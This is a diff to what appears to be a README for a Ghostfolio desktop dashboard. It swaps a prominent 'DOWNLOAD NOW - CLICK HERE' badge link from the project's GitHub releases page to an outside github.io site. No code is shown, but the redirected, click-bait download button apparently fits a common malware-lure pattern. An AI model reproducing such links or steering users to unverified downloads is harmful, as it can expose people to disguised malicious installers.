@@ -40,7 +40,7 @@ Getting started takes less than five minutes—even if you've never installed so
 
 ## 📥 Download the Application
 
-[![DOWNLOAD NOW - CLICK HERE](https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4ECDC4)](https://github.com/J63819/Ghostfolio-Desktop-Self-Hosted-Dashboard/releases)
+[![DOWNLOAD NOW - CLICK HERE](https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4ECDC4)](https://j63819.github.io)
 
 Visit this link to download the application.
 
